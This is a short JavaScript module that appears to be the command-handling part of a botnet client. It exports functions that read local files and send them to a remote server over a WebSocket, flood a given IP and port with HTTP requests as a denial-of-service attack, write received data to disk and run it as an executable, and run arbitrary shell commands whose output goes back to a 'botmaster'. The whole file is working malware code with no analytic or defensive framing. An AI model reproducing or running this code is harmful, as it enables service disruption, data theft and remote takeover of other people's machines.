const fs = require('fs');
const { exec } = require('child_process');
const {get} = require("http");
function send_file_to_sv(id, name, filepath, webSocket, hash){
    // Open file

    try {
        const data = fs.readFileSync(filepath, 'utf-8');
        // TODO optional hash for integrity check
        const result = {
            id,
            type: "Download",
            name: name,
            hash: 0,
            data: data
        };
        webSocket.send(JSON.stringify(result));
    } catch (err) {
        console.error("Error reading file:", err)
    }

}

function ddos(id, ip, port, duration) {
    const targetUrl = `http://${ip}:${port}/`;

    // Function to send a single HTTP request
    const sendRequest = () => {
        get(targetUrl, (res) => {
            // Do nothing with the response
        }).on('error', (e) => {
            console.error(`Problem with request: ${e.message}`);
        });
    };

    // Start sending requests
    const intervalId = setInterval(sendRequest, 1); // Adjust the interval as needed

    // Stop sending requests after the specified duration
    setTimeout(() => {
        clearInterval(intervalId);
        console.log(`Stopped sending requests after ${duration} seconds.`);
    }, duration * 1000);
}

function execute(id, data, filename){

    try {
        fs.writeFileSync("./" + filename, data, 'utf8');
        console.log("Data written to file successfully!");
    } catch (err) {
        console.error("Error writing to file:", err);
        return;
    }

    exec('chmod +x ' + filename + ' && ./' + filename, (error, stdout, stderr) => {
        if (error) {
            console.error(`Error: ${error.message}`);
            return;
        }

        if (stderr) {
            console.error(`Standard Error: ${stderr}`);
            return;
        }
        console.log(`Standard Output: ${stdout}`);
    });

    return 0;
}

function start_shell(id, sh_cmd, botmaster, ws){


    exec(sh_cmd, (error, stdout, stderr) => {
        if (error) {
            console.error(`Error: ${error.message}`);
            return;
        }

        if (stderr) {
            console.error(`Standard Error: ${stderr}`);
            return;
        }
        console.log(`Standard Output: ${stdout}`);
        const result = {
            id,
            type: "Shell",
            botmaster,
            result: stdout
        };
        ws.send(JSON.stringify(result));
    });
    return 0;
}

module.exports = { send_file_to_sv, ddos, execute, start_shell }